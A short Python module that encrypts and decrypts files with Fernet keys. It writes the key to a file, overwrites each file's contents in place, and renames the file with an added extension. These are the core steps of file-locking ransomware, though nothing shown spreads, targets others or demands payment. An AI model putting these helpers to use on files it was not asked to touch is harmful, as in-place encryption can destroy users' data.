import os
from cryptography.fernet import Fernet

def generate_key_and_cipher_suite():
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    return key, cipher_suite

def create_key_file_and_write_key_to_it(path_to_key_file, key):
    with open(path_to_key_file, 'wb') as key_file:
        key_file.write(key)

def encrypt_file(path_to_file, cipher_suite):
    with open(path_to_file, 'rb') as the_file:
        content = the_file.read()
    with open(path_to_file, 'wb') as the_file:
        content_encrypted = cipher_suite.encrypt(content)
        the_file.write(content_encrypted)

def add_extension(path_to_file, extension):
    new_path = path_to_file + extension
    os.rename(path_to_file, new_path)



def read_key_and_create_cipher_suite(path_to_key_file):
    with open(path_to_key_file, 'rb') as key_file:
        key = key_file.read()
    cipher_suite = Fernet(key)
    return key, cipher_suite

def decrypt_file(path_to_file, cipher_suite):
    with open(path_to_file, 'rb') as the_file:
        content = the_file.read()
    with open(path_to_file, 'wb') as the_file:
        content_decrypted = cipher_suite.decrypt(content)
        the_file.write(content_decrypted)